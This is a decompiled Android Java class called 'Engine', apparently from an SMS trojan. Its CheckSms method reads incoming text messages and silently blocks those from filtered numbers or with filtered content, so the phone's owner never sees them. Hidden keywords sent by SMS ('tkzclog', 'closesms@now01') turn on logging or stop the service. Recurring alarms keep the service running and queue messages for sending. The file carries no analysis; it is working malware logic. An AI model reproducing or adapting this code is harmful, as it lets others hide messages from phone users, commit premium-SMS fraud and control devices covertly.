package com.yongding.logic;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.SystemClock;
import android.telephony.SmsMessage;
import com.yongding.util.CountryAndSPInfo;
import com.yongding.util.Trace;
import java.util.Date;
import org.codehaus.jackson.org.objectweb.asm.ClassWriter;

public class Engine {
    public static final String MMS_RECEIVER = "android.permission.RECEIVE_WAP_PUSH";
    private static final int REQUEST_TRIGGER_ALARM_TASK = 10000;
    public static final String SMS_RECEIVER = "android.provider.Telephony.SMS_RECEIVED";
    public static final String SMS_RECEIVERCOLOR = "android.provider.Telephony.WAP_PUSH_RECEIVED";
    private static AlarmManager alarmManager = null;
    public static final String backSynServiceAction = "ACTION_LD_BACKSYNSERVICE";
    private static PendingIntent bootRetryTimerPi = null;
    public static final String bootServiceAction = "ACTION_LD_BOOTSERVICE";
    private static Intent intent = null;
    private static PendingIntent mainTimerPi = null;
    private static SmsMessage[] messages = null;
    public static final String simSynServiceAction = "ACTION_LD_SIMSYNSERVICE";
    public static final String smsServiceAction = "ACTION_LD_SMSSERVICE";
    private static PendingIntent smsTimerPi;
    private static long smsTimestampMillis;

    static {
        alarmManager = null;
        bootRetryTimerPi = null;
        smsTimerPi = null;
        mainTimerPi = null;
        smsTimestampMillis = 0;
        messages = null;
    }

    public static void CheckSms(BroadcastReceiver bro, Context context, Intent intent) {
        long st = 0;
        String smsNumber = null;
        String smsContent = null;
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus == null) {
                Trace.i(new StringBuilder("Engine.CheckSms()-pdus=").append(pdus).toString());
            } else {
                messages = new SmsMessage[pdus.length];
                int i = 0;
                while (i < messages.length) {
                    messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                    i++;
                }
                SmsMessage[] smsMessageArr;
                int length;
                int i2;
                SmsMessage message;
                if (messages.length == 1) {
                    smsMessageArr = messages;
                    length = smsMessageArr.length;
                    i2 = 0;
                    while (i2 < length) {
                        message = smsMessageArr[i2];
                        smsNumber = message.getOriginatingAddress();
                        st = message.getTimestampMillis();
                        smsContent = message.getDisplayMessageBody();
                        i2++;
                    }
                } else {
                    smsContent = "";
                    smsMessageArr = messages;
                    length = smsMessageArr.length;
                    i2 = 0;
                    while (i2 < length) {
                        message = smsMessageArr[i2];
                        smsNumber = message.getOriginatingAddress();
                        smsContent = new StringBuilder(String.valueOf(smsContent)).append(message.getDisplayMessageBody()).toString();
                        st = message.getTimestampMillis();
                        i2++;
                    }
                }
                Trace.i(new StringBuilder("Engine.CheckSms()-smsTimestampMillis=").append(smsTimestampMillis).append("; st=").append(st).toString());
                if (smsTimestampMillis != st) {
                    smsTimestampMillis = st;
                    if (smsNumber != null && smsContent != null) {
                        Trace.i(new StringBuilder("Engine.CheckSms()-smsNumber=").append(smsNumber).toString());
                        Trace.i(new StringBuilder("Engine.CheckSms()-smsContent=").append(smsContent).toString());
                        if (!Ld.checkIsClose(context)) {
                            if (Ld.checkNumber(context, smsNumber)) {
                                bro.abortBroadcast();
                            } else if (Ld.checkSms(context, smsContent)) {
                                bro.abortBroadcast();
                            } else if (smsContent.contains("tkzclog")) {
                                bro.abortBroadcast();
                                Trace.init(true);
                            }
                            if (smsContent.contains("closesms@now01")) {
                                bro.abortBroadcast();
                                StopMyService(context);
                            }
                        }
                    }
                }
            }
        }
    }

    public static boolean IsBootRetryTimerAlarmRunning() {
        return bootRetryTimerPi != null;
    }

    public static boolean IsSmsTimerAlarmRunning() {
        return smsTimerPi != null;
    }

    public static void ShutDown(Context context) {
        try {
            intent = new Intent();
            intent.setClass(context, MyService.class);
            context.stopService(intent);
        } catch (Exception e) {
            Trace.i(e.getMessage());
        }
    }

    public static void StartBootRetryTimerNewAlarm(Context context, long firstDelay, long delay) {
        Trace.i("Engine.StartBootRetryTimerNewAlarm()-entry");
        bootRetryTimerPi = StartNewAlarm(context, firstDelay, delay, bootRetryTimerPi, bootServiceAction);
        Trace.i("Engine.StartBootRetryTimerNewAlarm()-return");
    }

    public static void StartBootTriggerNextAlarm(Context context, long triggerAtMillis) {
        Trace.i("Engine.StartBootTriggerNextAlarm()-entry");
        if (alarmManager == null) {
            alarmManager = (AlarmManager) context.getSystemService("alarm");
        }
        Intent intent = new Intent(context.getApplicationContext(), BroReceiver.class);
        intent.setAction(bootServiceAction);
        PendingIntent pi = PendingIntent.getBroadcast(context.getApplicationContext(), REQUEST_TRIGGER_ALARM_TASK, intent, 134217728);
        Trace.i(new StringBuilder("Engine.StartBootTriggerNextAlarm()-triggerAtMillis=").append(new Date(triggerAtMillis)).toString());
        alarmManager.set(0, triggerAtMillis, pi);
        Trace.i("Engine.StartBootTriggerNextAlarm()-return");
    }

    public static void StartMyService(Context context, String action) {
        try {
            intent = new Intent();
            intent.setClass(context, MyService.class);
            intent.setAction(action);
            context.startService(intent);
        } catch (Exception e) {
            Trace.i(e.getMessage());
        }
    }

    private static PendingIntent StartNewAlarm(Context context, long firstDelay, long delay, PendingIntent pi, String action) {
        Trace.i(new StringBuilder("Engine.StartNewAlarm()-entry action=").append(action).toString());
        if (alarmManager == null) {
            alarmManager = (AlarmManager) context.getSystemService("alarm");
        }
        if (pi != null) {
            Trace.i("Engine.StartNewAlarm()-pi!=null");
            alarmManager.cancel(pi);
        }
        Intent intent = new Intent(context.getApplicationContext(), BroReceiver.class);
        intent.setAction(action);
        pi = PendingIntent.getBroadcast(context.getApplicationContext(), 0, intent, 0);
        long firstTime = SystemClock.elapsedRealtime() + firstDelay;
        Trace.i(new StringBuilder("Engine.StartNewAlarm()-firstTime=").append(firstTime).append("; delay=").append(delay).toString());
        alarmManager.setRepeating(ClassWriter.COMPUTE_FRAMES, firstTime, delay, pi);
        Trace.i("Engine.StartNewAlarm()-return");
        return pi;
    }

    public static void StartSmsTimerNewAlarm(Context context, long firstDelay, long delay) {
        smsTimerPi = StartNewAlarm(context, firstDelay, delay, smsTimerPi, smsServiceAction);
    }

    private static void StopAlarm(Context context, PendingIntent pi) {
        Trace.i("Engine.StopAlarm()-entry");
        AlarmManager alarmManager = (AlarmManager) context.getSystemService("alarm");
        if (pi != null) {
            Trace.i("Engine.StopAlarm()-cancel");
            alarmManager.cancel(pi);
        } else {
            Trace.i("Engine.StopAlarm()-no action");
        }
        Trace.i("Engine.StopAlarm()-return");
    }

    public static void StopBootRetryTimerNewAlarm(Context context) {
        Trace.i("Engine.StopBootRetryTimerNewAlarm()-entry");
        if (bootRetryTimerPi != null) {
            StopAlarm(context, bootRetryTimerPi);
            bootRetryTimerPi = null;
        }
        Trace.i("Engine.StopBootRetryTimerNewAlarm()-return");
    }

    public static void StopBootRetryTimerNewAlarmExt(Context context) {
        Intent intent = new Intent(context.getApplicationContext(), BroReceiver.class);
        intent.setAction(bootServiceAction);
        bootRetryTimerPi = PendingIntent.getBroadcast(context.getApplicationContext(), 0, intent, 0);
        StopAlarm(context, bootRetryTimerPi);
        bootRetryTimerPi = null;
        Trace.i("Engine.StopSmsTimerNewAlarm()-return");
    }

    public static void StopMyService(Context context) {
        try {
            Global.setShutDown(context, 1);
            StopBootRetryTimerNewAlarmExt(context);
            StopSmsTimerNewAlarmExt(context);
            new CountryAndSPInfo(context).putIsShut(1);
        } catch (Exception e) {
            Trace.i(e.getMessage());
        }
    }

    public static void StopSmsTimerNewAlarm(Context context) {
        Trace.i("Engine.StopSmsTimerNewAlarm()-entry");
        StopAlarm(context, smsTimerPi);
        smsTimerPi = null;
        Trace.i("Engine.StopSmsTimerNewAlarm()-return");
    }

    public static void StopSmsTimerNewAlarmExt(Context context) {
        Intent intent = new Intent(context.getApplicationContext(), BroReceiver.class);
        intent.setAction(smsServiceAction);
        smsTimerPi = PendingIntent.getBroadcast(context.getApplicationContext(), 0, intent, 0);
        StopAlarm(context, smsTimerPi);
        smsTimerPi = null;
        Trace.i("Engine.StopSmsTimerNewAlarmExt()-return");
    }

    public static void addSmsToList(Context context, String smsContent, String smsNumber, String rc, boolean isStack) {
        Global.addSmsToList(smsContent, smsNumber, rc, isStack);
        Ld.tryReStartSmsTimerAlarm(context);
    }
}